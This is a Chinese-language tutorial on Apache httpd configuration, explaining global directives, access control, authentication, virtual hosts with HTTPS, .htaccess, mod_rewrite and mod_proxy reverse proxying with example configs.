\\\u0026#34;%{User-Agent}i\\\u0026#34;\u0026#34; combined CustomLog \u0026#34;logs/access_log\u0026#34; combined # -------------------- 包含其他配置文件 -------------------- IncludeOptional conf.d/*.conf 全局配置 这部分指令定义了Apache服务器的底层运行参数，影响服务器的整体性能和安全\nServerRoot \u0026#34;/etc/httpd\u0026#34; Listen 80 User apache Group apache PidFile run/httpd.pid Timeout 60 KeepAlive On MaxKeepAliveRequests 100 KeepAliveTimeout 5 ServerRoot：指定Apache的安装根目录\n配置文件中的所有相对路径（如PidFile, ErrorLog）都将基于此目录进行解析\nListen：指定服务器监听的网络地址和端口\n若不指定IP地址，则监听所有网络接口\n可以配置多个Listen指令来监听不同的端口或地址，例如Listen 80和Listen 127.0.0.1:8080\nUser \u0026amp; Group：设置运行Apache工作进程的系统用户和用户组\n主进程（master process）以root身份启动以绑定低位端口（\u0026lt;1024），但子进程会切换到此处的低权限用户，这是关键的安全措施\nPidFile：指定于存放Apache主进程的进程ID（PID）的文件\n这个文件被apachectl等控制脚本用来向主进程发送信号（如stop, restart, reload）\n路径通常是相对于ServerRoot的，如果没写，Apache 会用编译时的默认路径：\nDebian/Ubuntu：/var/run/apache2/apache2.pid RHEL/CentOS：/var/run/httpd/httpd.pid 源码安装：logs/httpd.pid Timeout：服务器在各种网络操作中等待的秒数，包括等待接收GET请求、在TCP包发送之间等待ACK等\n如果超过此时长，连接将被视为超时并关闭\nKeepAlive：启用HTTP持久连接\n开启后，客户端可以在同一个TCP连接上发送多个请求，极大减少了TCP握手和慢启动的开销，显著提升网站加载速度，特别是对于包含大量小资源的页面\nMaxKeepAliveRequests：在KeepAlive开启时，限制单个持久连接上允许处理的最大请求数\n达到此数目后，连接会自动关闭，有助于防止某个客户端长时间占用连接，并能周期性地回收资源\nKeepAliveTimeout：在KeepAlive开启时，设置服务器完成请求后等待下次请求的最长时间（秒）\n如果超时仍未收到新请求，连接将关闭\n合理的设置（通常是2-5秒）可以在性能和服务器资源消耗之间取得平衡\n模块加载与条件判断 Apache的功能是高度模块化的，使用任何高级功能（如SSL、重写、代理）前，必须先加载对应的模块\nLoadModule mpm_event_module modules/mod_mpm_event.so LoadModule authz_core_module modules/mod_authz_core.so Include conf.modules.d/*.conf \u0026lt;IfModule dir_module\u0026gt; DirectoryIndex index.html index.php \u0026lt;/IfModule\u0026gt; LoadModule：在服务器启动时动态加载指定的模块，使其提供的功能和指令在配置中可用\n语法为：\nLoadModule \u0026lt;模块名\u0026gt; \u0026lt;模块文件路径\u0026gt; 模块名是模块内部定义的标识符，路径通常是相对于ServerRoot的\nInclude：把其它配置文件包含进来\nApache（httpd）的模块配置通常被拆分放在conf.modules.d/目录下，每个模块一个配置文件：\n/etc/httpd/conf.modules.d/00-base.conf /etc/httpd/conf.modules.d/00-mpm.conf /etc/httpd/conf.modules.d/01-cgi.conf 这些.conf文件里一般只有一两行LoadModule 指令：\nLoadModule mpm_prefork_module modules/mod_mpm_prefork.so LoadModule rewrite_module modules/mod_rewrite.so LoadModule ssl_module modules/mod_ssl.so 那么主配置文件（httpd.conf）里只要写下面的include命令：\nInclude conf.modules.d/*.conf 这样就能把这些模块加载指令全部引入，模块配置更加独立，更好管理\n\u0026lt;IfModule\u0026gt;块：条件容器块，其内部的指令仅在指定的模块被加载时才会被处理\n这使得配置文件具有更好的可移植性，如果将配置文件部署到一个没有加载特定模块的服务器上，Apache不会因为无法识别模块内的指令而启动失败，而是会忽略整个\u0026lt;IfModule\u0026gt;块\n\u0026lt;IfModule dir_module\u0026gt; DirectoryIndex index.html index.php \u0026lt;/IfModule\u0026gt; 在上面的例子，DirectoryIndex指令只有mod_dir模块（在配置文件里显示为dir_module）存在时才生效\n主服务器配置 这部分指令定义了“默认服务器”的行为\n当一个请求的Host头没有匹配到任何\u0026lt;VirtualHost\u0026gt;块时，Apache会使用这里的配置来处理该请求\nServerAdmin root@localhost ServerName www.example.com:80 DocumentRoot \u0026#34;/var/www/html\u0026#34; \u0026lt;IfModule dir_module\u0026gt; DirectoryIndex index.html index.php \u0026lt;/IfModule\u0026gt; ServerAdmin：设置了服务器管理员的电子邮件地址\n这个地址会显示在Apache生成的错误页面中，方便用户报告问题\nServerName：为服务器设置一个规范的域名\n如果未设置，Apache会尝试通过反向DNS查找来确定，这可能导致启动缓慢或结果不准确\n在全局配置中，它主要用于服务器自我识别和生成重定向URL\nDocumentRoot：该指令指定了存放网页文件的根目录\n当收到一个请求时，Apache会在此目录下查找对应的文件\nDirectoryIndex：当客户端请求一个目录（URL以/结尾）时，Apache会在此目录中查找的文件列表\n这是Apache模块dir_module里的命令\n它会按照指令中列出的顺序查找，并返回第一个找到的文件作为响应\nDirectoryIndex index.html index.php 比如上面的命令，如果用户访问http://www.example.com/docs/（这是个目录），Apache会依次查找：\n/var/www/example/docs/index.html /var/www/example/docs/index.php 然后将找到的第一个存在的文件返回\n如果都没有，可能报403Forbidden，或者交给mod_autoindex显示目录列表\n目录与文件访问控制 这是Apache安全配置的核心，它允许对文件系统中的路径和特定文件名进行精细的访问控制\n\u0026lt;Location /admin\u0026gt; AuthType Basic AuthName \u0026#34;Admin Area\u0026#34; AuthUserFile /etc/httpd/.htpasswd Require valid-user \u0026lt;/Location\u0026gt; \u0026lt;Directory /\u0026gt; AllowOverride none Require all denied \u0026lt;/Directory\u0026gt; \u0026lt;Directory \u0026#34;/var/www/html\u0026#34;\u0026gt; Options Indexes FollowSymLinks AllowOverride None Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Files \u0026#34;.ht*\u0026#34;\u0026gt; Require all denied \u0026lt;/Files\u0026gt; Apache通过\u0026lt;Directory\u0026gt;、\u0026lt;Files\u0026gt;、\u0026lt;Location\u0026gt;这三种核心容器块，提供了对服务器资源精细化的访问控制\n他们的语法格式十分相似，大部分内部指令也通用，只有小部分不同\n\u0026lt;Directory\u0026gt; / \u0026lt;DirectoryMatch\u0026gt;块 —— 物理路径匹配 将其中的指令应用于服务器文件系统上的物理目录以及这些目录下的所有文件和子目录\n格式：\n\u0026lt;Directory \u0026#34;物理路径\u0026#34;\u0026gt; ... \u0026lt;/Directory\u0026gt; 精确路径：\n\u0026lt;Directory \u0026#34;/var/www/html\u0026#34;\u0026gt; ... \u0026lt;/Directory\u0026gt; 通配符路径：\n\u0026lt;Directory \u0026#34;/var/www/users/*/public_html\u0026#34;\u0026gt; ... \u0026lt;/Directory\u0026gt; 正则有两种写法，效果相同：\n正则表达式路径（使用\u0026lt;Directory\u0026gt;，以 ~ 开头）：\n\u0026lt;Directory ~ \u0026#34;^/var/www/project-(a|b)/src\u0026#34;\u0026gt; ... \u0026lt;/Directory\u0026gt; 正则表达式路径（使用\u0026lt;DirectoryMatch\u0026gt;）：\n\u0026lt;DirectoryMatch \u0026#34;^/var/www/project-(a|b)/src\u0026#34;\u0026gt; ... \u0026lt;/DirectoryMatch\u0026gt; \u0026lt;Files\u0026gt; / \u0026lt;FilesMatch\u0026gt; 块 —— 文件名匹配 将其中的指令应用于特定文件名的文件，而不考虑这些文件位于哪个目录下\n\u0026lt;Files\u0026gt;格式：\n\u0026lt;Files \u0026#34;文件名\u0026#34;\u0026gt; ... \u0026lt;/Files\u0026gt; 具体格式参考\u0026lt;Directory\u0026gt;块\n\u0026lt;Location\u0026gt; / \u0026lt;LocationMatch\u0026gt;块 —— URL路径匹配 将其中的指令应用于客户端请求的URL路径\n它不关心这个URL最终对应到哪个文件，甚至这个URL可能根本不对应任何文件（例如由模块动态生成的内容或代理的请求）\n\u0026lt;Location\u0026gt;格式：\n\u0026lt;Files \u0026#34;文件名\u0026#34;\u0026gt; ... \u0026lt;/Files\u0026gt; 具体格式参考\u0026lt;Location\u0026gt;块\n常用指令 以下是在上述容器块中常用的指令，我们会详细说明每个指令的格式、参数和用法\nRequire：访问授权 用于定义谁可以访问资源\n格式：\nRequire [not] \u0026lt;授权类型\u0026gt; [参数] not是一个可选的修饰符，用来取反\n授权类型：\n授权类型 参数 说明 all granted / denied 无条件允许或拒绝所有请求 ip IP地址, 子网掩码, 网段 匹配客户端的IP地址\n例如192.168.1.1、10.0.0.0/8 host 主机名, 域名 匹配客户端的主机名\n例如example.org\n注意：这需要进行DNS查询，可能影响性能 valid-user (无) 要求用户必须通过身份认证 user 用户名列表 要求用户必须是已认证的指定用户之一\n例如Require user admin john group 用户组列表 要求用户必须属于已认证的指定用户组之一\n例如Require group administrators 使用Require后，在外层还可以嵌套逻辑容器：\n逻辑容器 逻辑关系 说明 \u0026lt;RequireAny\u0026gt; OR 只要有一条Require满足就允许访问 \u0026lt;RequireAll\u0026gt; AND 必须所有Require条件都满足才允许访问 \u0026lt;RequireNone\u0026gt; NOT 如果里面任意一条Require满足，就拒绝访问（取反） 示例：\n\u0026lt;Directory \u0026#34;/var/www/private\u0026#34;\u0026gt; \u0026lt;RequireAny\u0026gt; \u0026lt;RequireAll\u0026gt; Require ip 192.168.0.0/16 Require group admins \u0026lt;/RequireAll\u0026gt; Require user superadmin \u0026lt;/RequireAny\u0026gt; \u0026lt;/Directory\u0026gt; 意思是IP在192.168网段且用户属于admins组，或者用户名是superadmin的，允许访问/var/www/private\nOptions：特性控制 控制目录中可用的服务器功能和服务，只用于\u0026lt;Directory\u0026gt;块\n格式:\nOptions [+-]关键字1 [+-]关键字2 ... 可以列出多个关键字，使用+或-前缀可以在现有选项基础上添加或移除单个选项\n参数字段:\n关键字 说明 Indexes 如果目录中缺少索引文件（如 index.html），则允许服务器生成并显示该目录的文件列表 FollowSymLinks 允许服务器跟随符号链接访问其指向的文件或目录 SymLinksIfOwnerMatch 一个更安全的FollowSymLinks版本，仅当符号链接和目标文件的所有者相同时才跟随 ExecCGI 允许在该目录中执行CGI脚本 MultiViews 启用内容协商功能，当用户请求的URL没有扩展名时，服务器可以根据客户端偏好（如语言）自动选择最合适的文件 All 启用除MultiViews之外的所有选项 None 禁用所有选项 示例：\nApache的Options指令有两种使用方式：\n覆盖式（没有+/-）\nOptions Indexes FollowSymLinks 这一行会清空继承的配置，然后只启用Indexes和FollowSymLinks\n增量式（有+/-）\nOptions -Indexes -ExecCGI +FollowSymLinks 这一行会在继承父级Options的基础上修改：去掉Indexes，去掉ExecCGI，加上FollowSymLinks\nAllowOverride：覆盖控制 决定目录中的.htaccess文件是否可以覆盖主配置文件中的设置，仅能在\u0026lt;Directory\u0026gt;块中使用\n下文会详细说明.htaccess文件：.htaccess文件 格式:\nAllowOverride 关键字1 关键字2 ... 参数字段:\n关键字 说明 None 完全忽略.htaccess文件 All 允许.htaccess中的所有指令生效 AuthConfig 允许使用认证相关的指令 FileInfo 允许使用MIME类型、重写、头信息相关的指令 Indexes 允许使用索引相关的指令 Limit 允许使用访问控制指令 Options 允许在.htaccess中使用Options 指令 示例:\n\u0026lt;Directory \u0026#34;/var/www/wordpress\u0026#34;\u0026gt; AllowOverride FileInfo AuthConfig Limit \u0026lt;/Directory\u0026gt; Auth*：身份认证系列 这一系列指令共同工作，为资源设置基于用户名和密码的保护\n指令 作用 格式 说明 AuthType 设置认证类型 `AuthType Basic Digest` AuthName 设置认证区域名称 AuthName \u0026quot;提示信息\u0026quot; 浏览器密码输入框会显示该提示信息 AuthUserFile 指定用户及密码文件 AuthUserFile \u0026quot;/path/to/.htpasswd\u0026quot; 文件由 htpasswd 工具创建，存储用户名和加密密码 AuthGroupFile 指定用户组文件 AuthGroupFile \u0026quot;/path/to/.htgroups\u0026quot; 文件定义用户组及其成员，配合 Require group 使用 示例：\n\u0026lt;Location \u0026#34;/admin\u0026#34;\u0026gt; AuthType Basic AuthName \u0026#34;Admin Area\u0026#34; AuthUserFile \u0026#34;/etc/httpd/.htpasswd\u0026#34; Require valid-user \u0026lt;/Location\u0026gt; 用户访问 http://example.com/admin后：\n要求客户端进行Basic认证 浏览器弹出登录框，显示Admin Area 用户输入用户名/密码，Apache 从/etc/httpd/.htpasswd 验证 验证成功 → 允许访问/admin 验证失败 → 返回401 Unauthorized SetHandler：处理器指定 指定服务器遇到某个资源时，交给哪种处理器来处理请求\n格式：\nSetHandler \u0026lt;处理器名称\u0026gt; 参数字段\n处理器 说明 server-status 由mod_status模块处理，生成服务器状态报告 server-info 由mod_info模块处理，生成服务器详细配置信息 application/x-httpd-php 强制由PHP处理器执行（使用mod_php时） cgi-script 由mod_cgi或mod_cgid处理，执行CGI脚本 cgi 由mod_cgi处理，通常和cgi-script等价 perl-script 由mod_perl处理，执行Perl脚本 proxy-server 由mod_proxy处理，将请求代理到后端服务器 dav 由mod_dav处理，实现WebDAV功能 imap-file 由mod_imap处理，用于访问邮件文件 示例：\n\u0026lt;Location \u0026#34;/server-status\u0026#34;\u0026gt; SetHandler server-status Require ip 127.0.0.1 \u0026lt;/Location\u0026gt; 这段配置开启了Apache的服务器状态监控页面/server-status，但只允许本机访问，常用于管理员调试和性能监控\nHeader：HTTP头控制 来自mod_headers模块，用于添加、修改或删除HTTP响应头\n格式：\nHeader [condition] action 头部名称 \u0026#34;值\u0026#34; 条件参数：\n条件 (condition) 说明 early 在响应生成的早期阶段设置头部（比默认阶段更早） expr=\u0026quot;表达式\u0026quot; 只有当表达式为真时才执行该Header动作 always 无论响应状态码或其他限制，强制应用该Header 动作参数：\n动作 (action) 说明 set 设置HTTP响应头，如果同名头已存在，则覆盖它 add 添加HTTP响应头，即使同名头已存在，也会再添加一个 append 将值附加到已存在的同名头值的末尾 unset 从响应中移除指定的HTTP头 echo 仅用于调试，输出指定头的值（很少用） edit 修改已存在头的值，基于正则替换 merge 合并多个值为同一个头 示例:\n\u0026lt;FilesMatch \u0026#34;\\.(css|js)$\u0026#34;\u0026gt; Header set X-Content-Type-Options \u0026#34;nosniff\u0026#34; Header set X-Frame-Options \u0026#34;DENY\u0026#34; Header append X-Powered-By \u0026#34;Apache\u0026#34; Header set Cache-Control \u0026#34;max-age=3600\u0026#34; \u0026#34;expr=%{REQUEST_STATUS} == 200\u0026#34; Header always set Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains\u0026#34; \u0026lt;/FilesMatch\u0026gt; 对.css和.js文件设置响应头，防止MIME嗅探和被嵌入iframe，添加服务器标识，同时控制缓存和强制HTTPS\n日志配置 ErrorLog \u0026#34;logs/error_log\u0026#34; LogLevel warn LogFormat \u0026#34;%h %l %u %t \\\u0026#34;%r\\\u0026#34; %\u0026gt;s %b \\\u0026#34;%{Referer}i\\\u0026#34; \\\u0026#34;%{User-Agent}i\\\u0026#34;\u0026#34; combined CustomLog \u0026#34;logs/access_log\u0026#34; combined ErrorLog：错误日志文件的路径\n服务器启动、运行中的错误、模块的诊断信息都会记录在其中\nLogLevel：记录在错误日志中的信息的详细程度\n每条错误日志条目都会带有一个严重性等级，这些等级是代码里写死的，作为用户无法改变某个错误属于什么等级\nApache支持的日志级别（从高到低）如下：\n级别 描述 debug 记录所有信息，主要用于开发或调试，信息量极大，通常需编译时启用 info 普通信息，如配置加载成功、进程启动、连接创建等 notice 正常但重要的事件，如配置文件重载、进程关闭等 warn 警告信息，非致命错误，比如配置中存在问题但可以忽略或继续运行 error 运行过程中出现的错误，如连接失败、服务不可达等 crit 严重错误，Nginx可能无法继续运行 alert 必须立刻处理的严重问题 emerg 紧急状态，比如系统崩溃，Nginx无法启动 是否写入日志文件取决于LogLevel设置的阈值，只会写入大于等于当前设置等级的错误事件\n生产环境通常设置为warn以捕捉重要问题，同时避免日志泛滥\nLogFormat：指定访问日志的格式和名称\nLogFormat \u0026quot;...\u0026quot; combined表示把这个格式命名为combined\n格式字符串由固定的文本和%开头的变量组成，例如 %h (客户端IP), %\u0026gt;s (HTTP状态码), %D (处理请求的时间，单位微秒)，后面日志分析部分会详细说明\nCustomLog：设置日志文件位置，并指定使用的格式\nCustomLog \u0026quot;logs/access_log\u0026quot; combined表示使用名为combined的格式（也就是上一行定义的格式）记录访问信息到logs/access_log文件中\n虚拟主机配置文件 虚拟主机是一种技术，它允许一台物理服务器托管多个独立的网站\n与Nginx的一个server块就是一台虚拟主机不同，Apache一般将虚拟主机配置文件单独存放\n通常，我们会为每个网站创建一个独立的配置文件，在RHEL/CentOS中通常存放在conf.d/或conf/vhosts.d/ 目录下，而在Debian/Ubuntu中则存放在 sites-available/ 目录中\n\u0026lt;VirtualHost\u0026gt;块 \u0026lt;VirtualHost\u0026gt;块是定义一个虚拟主机所有配置的容器，它通过监听的IP地址和端口号来区分不同的虚拟主机\n\u0026lt;VirtualHost [ip-address]:[port]\u0026gt; ... \u0026lt;/VirtualHost\u0026gt; [ip-address]: 虚拟主机将响应的IP地址。*代表所有IP地址 [port]: 虚拟主机将监听的端口号。通常是80（HTTP）或443（HTTPS） 在一个虚拟主机配置文件中，我们可以配置与主配置文件中类似的指令，但范围仅限于这个特定的虚拟主机\n以下是一个完整的的虚拟主机配置文件示例，它处理了HTTPS服务的配置：\n# HTTPS 虚拟主机配置 \u0026lt;VirtualHost *:443\u0026gt; # 定义该虚拟主机响应的域名 ServerName www.example.com ServerAlias example.com # 为该虚拟主机指定独立的Web根目录 DocumentRoot \u0026#34;/var/www/example.com\u0026#34; # 配置独立的日志文件，便于分析 ErrorLog \u0026#34;/var/log/httpd/example.com-error.log\u0026#34; CustomLog \u0026#34;/var/log/httpd/example.com-access.log\u0026#34; combined # 开启HTTPS并指定证书文件 SSLEngine on SSLCertificateFile /etc/pki/tls/certs/example.com.crt SSLCertificateKeyFile /etc/pki/tls/private/example.com.key SSLCertificateChainFile /etc/pki/tls/certs/chain.crt # 为该站点的目录设置权限 \u0026lt;Directory \u0026#34;/var/www/example.com\u0026#34;\u0026gt; Options -Indexes +FollowSymLinks AllowOverride All Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; ServerName\n为该虚拟主机指定一个唯一的域名，当客户端的请求头中的Host字段与此处的ServerName或ServerAlias匹配时，该请求就会由这个虚拟主机处理\nServerAlias\n为虚拟主机设置一个或多个别名，例如example.com可以作为www.example.com的别名\nHTTPS 相关的指令：\nSSLEngine on: 开启SSL/TLS加密引擎 SSLCertificateFile: 指定SSL证书文件的路径（公钥，通常是.crt或.pem） SSLCertificateKeyFile: 指定与证书匹配的私钥文件路径（.key） SSLCertificateChainFile: 如果证书需要中间证书链才能被浏览器信任，则需要指定此文件 HTTP到HTTPS跳转 下面是一个经典的例子，它唯一的目的就是利用mod_rewrite模块将所有HTTP请求重定向到对应的HTTPS URL，以确保用户无论如何访问，都会被安全地引导至加密连接\n# 将所有 HTTP 请求永久重定向到 HTTPS \u0026lt;VirtualHost *:80\u0026gt; # 定义该虚拟主机响应的域名 ServerName www.example.com ServerAlias example.com # 启用URL重写引擎 RewriteEngine On # 定义重定向规则 RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L] \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt;\n*表示该虚拟主机将响应服务器上任何IP地址的请求，80指定了它只监听来自标准HTTP端口80的请求\nServerName 和 ServerAlias\n当一个请求的Host头（域名）与www.example.com或example.com匹配时，就由该虚拟主机来处理\n这确保了即使服务器上托管了多个网站，这条重定向规则也只会应用于example.com这个域名的HTTP请求，而不会影响到其他网站\nRewriteEngine On\n这是启用Apache mod_rewrite模块重写的开关，必须先开启，其下的RewriteRule指令才能生效\nRewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n这是整个重定向逻辑的核心，它定义了一条具体的重写规则\n^(.\\*)$\n它捕获了请求路径的全部内容，例如 /about/ 或 /images/logo.png?id=123\nhttps://%{HTTP_HOST}%{REQUEST_URI}\n这是重定向的目标URL\n**https://：**将协议从HTTP改为HTTPS\n**%{HTTP_HOST}：**这是一个Apache服务器变量，它会动态地获取客户端请求头中的Host字段值\n**%{REQUEST_URI}：**另一个服务器变量，它会动态地获取请求的完整URI路径，包括查询字符串\n[R=301,L]\n这些是控制重写行为的标志\nR=301：R代表redirect（重定向），301指定了HTTP状态码为301 Moved Permanently，这个状态码告诉浏览器和搜索引擎这个跳转是永久性的，确保SEO权重不丢失\nL：last，指示Apache一旦这条规则被匹配并执行，就停止处理任何后续的重写规则\n当一个用户访问http://www.example.com/login时，整个流程如下：\n客户端向服务器的80端口发送一个HTTP请求 Apache接收到请求，根据Host头匹配到这个\u0026lt;VirtualHost *:80\u0026gt;块 RewriteEngine On生效，Apache开始检查RewriteRule RewriteRule匹配到请求路径/login Apache根据规则，动态构建出目标URL：https://www.example.com/login R=301,L标志告诉Apache向客户端发送一个301重定向响应 客户端浏览器接收到301响应后，会自动向https://www.example.com/login发起一个新的请求，这个请求将由服务器上监听443端口的虚拟主机（即HTTPS配置）来处理 .htaccess文件 .htaccess文件（分布式配置文件）是一个目录级配置片段，只应用于\u0026lt;Directory\u0026gt;块\n它允许开发者或非root用户在不修改主配置文件的情况下，对特定目录及其子目录进行配置\n工作原理 Apach 在读取配置时并不会一次性加载.htaccess，而是每次处理请求时才去磁盘查找并应用它\n比如，当Apache收到一个对/var/www/site/dir/file.html的请求时，它会依次查找以下文件：\n/var/www/site/dir/.htaccess /var/www/site/.htaccess /var/www/.htaccess 每找到一个.htaccess，就解析并应用里面的配置写在对应\u0026lt;Directory\u0026gt;块中\n这种递归查找机制对性能有显著影响，因为它增加了文件系统的I/O开销\n因此，除非必要，通常不建议广泛使用.htaccess\n.htaccess文件中的指令是否生效，完全取决于前文提到过主文件配置的AllowOverride指令：\nAllowOverride：覆盖控制 典型用例与指令 下面是一个典型的.htaccess文件内容：\n# 启用重写引擎 RewriteEngine On # 将所有以.html结尾的请求重定向到不带.html的URL # 例如：/about.html -\u0026gt; /about RewriteRule ^(.*)\\.html$ /$1 [R=301,L] # 为目录设置访问密码保护 AuthType Basic AuthName \u0026#34;Restricted Area\u0026#34; AuthUserFile /var/www/site/dir/.htpasswd Require valid-user # 强制将目录索引文件设置为index.php DirectoryIndex index.php # 在响应头中添加自定义信息 \u0026lt;IfModule mod_headers.c\u0026gt; Header set X-Custom-Header \u0026#34;My Website\u0026#34; \u0026lt;/IfModule\u0026gt; 在上面的例子中，我们使用了以下指令：\nRewriteEngine和RewriteRule\nURL重写，这在构建“伪静态”URL或实现SEO友好的链接时非常有用\nAuth*系列指令\n用于对整个目录进行密码保护。这在/admin或/private等需要认证的目录中非常常见\nDirectoryIndex\n用于覆盖主配置文件中定义的索引文件顺序\nHeader\n添加或修改HTTP响应头\n这些指令与主配置文件中的用法相同，但其作用范围仅限于.htaccess文件所在的目录\n事实上，\u0026lt;Directory\u0026gt;块能够使用的指令，在.htaccess文件大多都能使用，只是范围受制于AllowOverride\n这使得它非常灵活，尤其是在共享主机环境中\n常用模块 Apache的核心优势在于其高度模块化的设计，几乎所有高级功能都由特定的模块提供。这些模块必须在主配置文件（通常是httpd.conf或apache2.conf）中通过LoadModule指令加载后才能使用。\n本章节将详细介绍几个Apache最常用且功能强大的模块，并讲解它们的配置方法。\nmod_rewrite：URL重写 mod_rewrite允许服务器根据正则表达式和规则集来重写请求的URL\n这通常用于实现伪静态、URL美化、HTTP重定向等\n使用之前，我们要确保在主配置文件中启用了mod_rewrite：\n在Debian/Ubuntu中：\na2enmod rewrite 在RHEL/CentOS中：\nLoadModule rewrite_module modules/mod_rewrite.so 核心指令 RewriteEngine 该指令用于在特定配置上下文中开启或关闭重写引擎\n开启：\nRewriteEngine On 关闭：\nRewriteEngine Off RewriteRule 这是定义重写规则的指令，其格式为：\nRewriteRule 模式 替代 [标志] 参数 含义 模式 用于匹配请求的URI路径（不包含域名和协议）的正则表达式 替代 匹配成功后，用于构建新URL的字符串或路径 标志 可选，用于控制重写规则的行为（如外部重定向、停止处理等） 常用标志：\n标志 缩写 含义 L last 停止处理当前规则集中的其他规则 R redirect 执行外部重定向（发送302状态码给浏览器）可指定状态码，如R=301 NC nocase 使模式匹配不区分大小写 P proxy 将请求代理到指定的替代URL，需要mod_proxy模块 QSA qsappend 将原始请求的查询字符串（URL中?之后的部分）附加到替代URL后 NE noescape 禁止对重写后的URL进行特殊字符转义 CO cookie 设置一个Cookie E env 设置环境变量 G gone 返回410 Gone状态码 F forbidden 返回403 Forbidden状态码 NC nocase 匹配不区分大小写 L last 停止后续规则处理 多个标志可以使用逗号,隔开，比如[R=301,L]\nRewriteCond 用于设置条件，当条件满足时才执行紧随其后的RewriteRule\nRewriteCond 字段 模式 [标志] 参数 含义 字段 待测试的字符串，比如主机名%{HTTP_HOST}等 模式 条件模式，支持正则表达式匹配 标志 可选标志，如 NC、OR 等 常用标志：\n标志 含义 NC No Case，匹配时忽略大小写 OR Logical OR，与下一条 RewriteCond 条件做“或”逻辑（默认是“与” AND） AND Logical AND，与下一条条件做“与”逻辑（默认可省略） GT Greater Than，仅对数值比较有效 LT Less Than，仅对数值比较有效 EQ Equal，数值比较等于 NE Not Equal，数值比较不等于 示例 示例1：实现伪静态URL 将https://example.com/article.php?id=123重写为https://example.com/article/123\n# 启用重写引擎 RewriteEngine On # 编写规则 RewriteRule ^article/([0-9]+)$ /article.php?id=$1 [NC,L] 示例2：强制所有请求到www子域名 将example.com重定向到www.example.com，这有助于避免重复内容问题\n# 使用RewriteCond指令添加条件 RewriteEngine On RewriteCond %{HTTP_HOST} ^example.com [NC] RewriteRule ^(.*)$ https://www.example.com/$1 [R=301,L] mod_proxy：代理模块 mod_proxy允许服务器将客户端的请求转发到其他后端服务器\n它使得Apache能够作为前端网关，对后端服务进行路由、负载均衡和安全保护\n要使用反向代理功能，必须加载mod_proxy及其子模块\n最常用的子模块是mod_proxy_http，用于代理HTTP协议的流量\n在Debian/Ubuntu上：\na2enmod proxy proxy_http 在RHEL/CentOS上：\nLoadModule proxy_module modules/mod_proxy.so LoadModule proxy_http_module modules/mod_proxy_http.so 反向代理 ProxyPass 用于将匹配路径的请求代理到指定的后端 URL\nProxyPass [路径] [URL] [可选参数] 参数 含义 路径 代理匹配的本地 URI 前缀，例如 /app URL 目标服务器地址，例如 http://127.0.0.1:8080/ 可选参数 retry=, timeout=, keepalive=on/off 等，用于控制代理行为 常用参数：\n参数 含义 retry=N 后端服务器失败时重试次数（默认 0，表示不重试） timeout=N 代理请求超时时间（秒），控制连接或响应等待时间 acquire=N 获取连接的超时时间（秒） keepalive=on/off 是否启用与后端的持久连接（HTTP Keep-Alive） disablereuse=on/off 禁止复用已建立的后端连接 max=number 最大并发连接数（可与 mod_proxy_balancer 配合） ttl=N 连接在连接池中存活的时间（秒） timeout=N 请求超时，连接超时 flushpackets=on/off 每次写数据包时立即刷新到客户端 lbmethod=byrequests/bytraffic/... 仅在负载均衡时使用，选择负载均衡策略 keepalive=on/off 控制是否启用HTTP持久连接 ProxyPassReverse 用于修改后端服务器响应头中的重定向地址，使客户端看到的URL正确\nProxyPassReverse [路径] [URL] 参数 含义 路径 客户端访问的本地URI前缀 URL 后端服务器的URL，对响应头进行重写 基本上写法和ProxyPass保持一致，也就是把url改回去，改成对应域名\n比如我们写下配置：\nProxyPass /app http://127.0.0.1:8080/myapp ProxyPassReverse /app http://127.0.0.1:8080/myapp 客户端请求：\nGET /app/ HTTP/1.1 Host: www.example.com Apache转发给后端：\nGET /myapp/ HTTP/1.1 Host: 127.0.0.1:8080 后端响应：\nHTTP/1.1 302 Found Location: http://127.0.0.1:8080/myapp/login 如果没有ProxyPassReverse，客户端会收到真实后端地址，绕过了代理\n有ProxyPassReverse时，Apache会把返回的Location改写成：\nHTTP/1.1 302 Found Location: http://www.example.com/app/login 客户端依然通过代理访问，保持一致性\nProxyPreserveHost 用来控制在反向代理时，是否保留客户端原始请求中的Host头信息\nProxyPreserveHost On|Off On：Apache 转发请求时，保留客户端原始Host头 Off（默认）：Apache会把Host头改成后端服务器的地址 示例 假设有一个Node.js应用在http://127.0.0.1:3000上运行，我们希望通过Apache的/api/路径来访问它\n\u0026lt;VirtualHost *:80\u0026gt; ServerName api.example.com # 禁用正向代理，后面会提到 ProxyRequests Off # 保留客户端原始Host头 ProxyPreserveHost On # 定义代理规则：将所有 /api/ 请求代理到后端服务器 ProxyPass /api/ http://127.0.0.1:3000/ # 重写响应头：将后端返回的 http://127.0.0.1:3000/ 地址重写为 http://api.example.com/api/ ProxyPassReverse /api/ http://127.0.0.1:3000/ \u0026lt;/VirtualHost\u0026gt; 当用户访问http://api.example.com/api/users时，Apache会接收请求，ProxyPass规则会将该请求转发到后端http://127.0.0.1:3000/users\n如果后端服务器返回了一个重定向响应（例如，Location: http://127.0.0.1:3000/auth），ProxyPassReverse会修改该头信息，将其替换为http://api.example.com/api/auth，确保用户的浏览器能够正确地跳转\n\u0026lt;Proxy\u0026gt;块 \u0026lt;Proxy\u0026gt; \u0026lt;Proxy\u0026gt;块是一个容器指令，用于对特定的代理URL或一组代理URL应用细粒度的配置\n它的使用类似于\u0026lt;Directory\u0026gt;或\u0026lt;Location\u0026gt;，但针对的是代理目标而不是本地文件系统\n虽然ProxyPass指令支持在行内附加参数，但使用\u0026lt;Proxy\u0026gt;块配合ProxySet指令，可以使配置更加清晰\n格式：\n\u0026lt;Proxy [URL]\u0026gt; ... \u0026lt;/Proxy\u0026gt; [URL]可以是一个完整的URL，一个协议（如http://），或使用通配符*（匹配所有代理目标）\n也可以使用\u0026lt;ProxyMatch\u0026gt;进行正则表达式匹配，就像之前的访问控制块一样\nProxySet \u0026lt;Proxy\u0026gt;容器和\u0026lt;Location\u0026gt;等容器一样，可以使用访问控制相关指令（比如 Require）\n但它还额外支持一些和代理相关的指令 —— ProxySet\nProxySet允许我们为特定的代理目标设置详细的控制参数\n格式：\nProxySet [参数名]=[值] [参数名]=[值]... 参数 含义 retry=N 后端服务器失败时重试次数（默认 0，表示不重试） timeout=N 代理请求超时时间（秒），控制连接或响应等待时间 acquire=N 获取连接的超时时间（秒） 